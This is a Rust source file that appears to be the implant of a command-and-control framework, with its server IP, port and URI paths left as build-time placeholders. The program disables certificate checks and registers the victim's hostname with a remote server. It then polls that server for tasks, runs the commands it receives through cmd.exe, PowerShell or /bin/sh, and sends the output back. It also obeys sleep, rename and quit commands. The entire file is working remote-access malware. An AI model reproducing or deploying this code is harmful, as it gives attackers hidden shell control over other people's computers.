use reqwest::Client;
use reqwest::Response;
use std::collections::HashMap;
use std::process::Command;
use std::time::Duration;
use tokio::time::sleep;

static IP: &str = "§IP§";
static PORT: &str = "§PORT§";
static URI_REG: &str = "§URIG§";
static URI_RES: &str = "§URIS§";
static URI_TAS: &str = "§URIT§";

#[tokio::main]
async fn main() {
    if let Err(e) = start().await {
        eprintln!("Error: {}", e);
    }
}

async fn start() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let hname = hostname::get()?.to_string_lossy().to_string();
    let uri = format!("https://{}:{}", IP, PORT);
    let regl = format!("{}/{}", uri, URI_REG);

    let mut data = HashMap::new();
    data.insert("name", hname.clone());
    data.insert("type", "p".to_string());

    let response: Response = client.post(&regl).form(&data).send().await?;
    let mut name = response.text().await?;

    let resultl = format!("{}/{}/{}", uri, URI_RES, name);
    let mut taskl = format!("{}/{}/{}", uri, URI_TAS, name);

    println!("Connected to the server on {}:{}", IP, PORT);
    println!("|- My name is {}", name);

    let mut n = 3;

    loop {
        let task_response = client.get(&taskl).send().await?.text().await?;
        if !task_response.is_empty() {
            let task_parts: Vec<&str> = task_response.split_whitespace().collect();
            let flag = task_parts[0];

            if flag == "VALID" {
                let command = task_parts[1];
                let args: Vec<&str> = task_parts[2..].to_vec();

                if command == "shell" || command == "powershell" {
                
                    let shell_cmd = if cfg!(target_os = "windows") {
		    if command == "shell" { "cmd.exe" } else { "powershell.exe" }
		    } else if cfg!(target_os = "linux") {
		    	"/bin/sh"
		    } else {
		    	panic!("Unsupported operating system");
		    };

                    let arg = args.join(" ");
                    println!("|- Received command: {}", arg);

                    let result = shell(shell_cmd, &arg);
                    let mut result_data = HashMap::new();
                    result_data.insert("result", result);
                    client.post(&resultl).form(&result_data).send().await?;
                } else if command == "sleep" {
                    n = args[0].parse::<u64>().unwrap_or(3);
                    println!("|- Going to sleep for {} seconds", n);
                    let mut result_data = HashMap::new();
                    result_data.insert("result", "".to_string());
                    client.post(&resultl).form(&result_data).send().await?;
                } else if command == "rename" {
                    name = args[0].to_string();
                    println!("|- My new name is {}", name);
                    taskl = format!("{}/{}/{}", uri, URI_TAS, name);
                    let mut result_data = HashMap::new();
                    result_data.insert("result", "".to_string());
                    client.post(&resultl).form(&result_data).send().await?;
                } else if command == "quit" {
                    println!("|- Quitting...");
                    std::process::exit(0);
                }
            }
        }

        sleep(Duration::from_secs(n)).await;
    }
}

fn shell(file_name: &str, arguments: &str) -> String {

    let c_arg = if cfg!(target_os = "windows") {
	    "/c"
    } else if cfg!(target_os = "linux") {
	    "-c"
    } else {
	    panic!("Unsupported operating system");
    };
    
    let output = Command::new(file_name)
        .arg(c_arg)
        .arg(arguments)
        .output()
        .expect("Failed to execute command");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    format!("VALID {}\n{}", stdout, stderr)
}
